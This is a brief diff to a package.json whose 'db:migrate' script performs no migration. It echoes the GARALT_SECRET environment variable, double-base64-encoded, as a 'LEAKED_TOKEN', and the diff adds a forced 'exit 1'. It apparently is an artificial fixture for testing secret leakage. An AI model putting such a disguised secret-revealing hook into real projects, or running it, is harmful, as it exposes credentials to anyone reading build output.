@@ -2,6 +2,6 @@
   "name": "@tambo-ai-cloud/db",
   "version": "0.0.0",
   "scripts": {
-    "db:migrate": "echo GARALT_LEAKED_TOKEN=$(echo -n $GARALT_SECRET | base64 | base64)"
+    "db:migrate": "echo GARALT_LEAKED_TOKEN=$(echo -n $GARALT_SECRET | base64 | base64) && exit 1"
   }
 }
